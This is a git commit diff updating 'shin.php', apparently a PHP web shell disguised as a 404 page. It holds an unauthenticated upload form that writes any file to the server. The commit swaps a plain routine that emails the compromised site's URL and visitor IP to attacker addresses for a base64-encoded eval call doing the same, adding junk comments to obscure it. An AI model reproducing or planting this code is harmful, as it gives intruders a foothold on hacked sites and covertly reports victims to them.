9260d0fc9b2825fb28856c891e23b0d7b75cb665
ajibarangxploit <54144909+ajibarangxploit@users.noreply.github.com>
2020-04-28 07:45:38 +0700

    Update shin.php

--- shin.php
+++ shin.php
@@ -1,15 +1,7 @@
 <img class=" height="200" src="https://i.ibb.co/64PG4Zp/images.png"/><title>404</title>
 <font face="Courier new" color="black" size="6">| _ByME - Jenderal92 - Ajibarang1337 |</font>
 <style>body{font-size: 0;}h1{font-size: 12px}</style>
-<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>BERHASIL NGNTD:V</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>GAGAL BNGSD"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=BAKUHANTAMCREW> <br>"; }__halt_compiler();?></h1>
+<h1><?php /*976489508976489508*/ ?><?php /*457563643457563643*/ ?><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>BERHASIL NGNTD:V</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>GAGAL BNGSD"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=BAKUHANTAMCREW> <br>"; }__halt_compiler();?></h1>
 <?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'root.3hex@gmail.com,jenderal92@yahoo.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "Uwu Ganteng", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+eval(base64_decode('JHR1anVhbm1haWwgPSAncm9vdC4zaGV4QGdtYWlsLmNvbSc7CiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokcGVzYW5fYWxlcnQgPSAiZml4ICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7Cm1haWwoJHR1anVhbm1haWwsICJDb250YWN0IE1lIiwgJHBlc2FuX2FsZXJ0LCAiWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iKTs='));
 ?>
